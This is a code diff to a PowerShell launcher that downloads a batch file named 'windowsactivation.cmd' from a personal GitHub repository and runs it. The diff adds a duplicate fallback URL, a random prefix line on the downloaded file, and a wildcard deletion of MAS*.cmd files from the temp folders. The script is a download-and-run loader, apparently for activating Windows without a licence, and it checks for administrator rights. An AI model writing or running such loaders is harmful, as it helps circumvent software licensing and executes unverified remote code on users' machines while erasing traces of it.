@@ -1,7 +1,9 @@
 $ErrorActionPreference = "Stop"
+# Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
 $DownloadURL = 'https://raw.githubusercontent.com/lolali054/Win/main/windowsactivation.cmd'
+$DownloadURL2 = 'https://raw.githubusercontent.com/lolali054/Win/main/windowsactivation.cmd'
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
@@ -11,14 +13,15 @@ try {
     $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
 }
 catch {
-    # Handle the error if necessary
+    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
 }
 
 $ScriptArgs = "$args "
-$content = $response
+$prefix = "@REM $rand `r`n"
+$content = $prefix + $response
 Set-Content -Path $FilePath -Value $content
 
 Start-Process $FilePath $ScriptArgs -Wait
 
-# Cleanup
-Remove-Item $FilePath
+$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
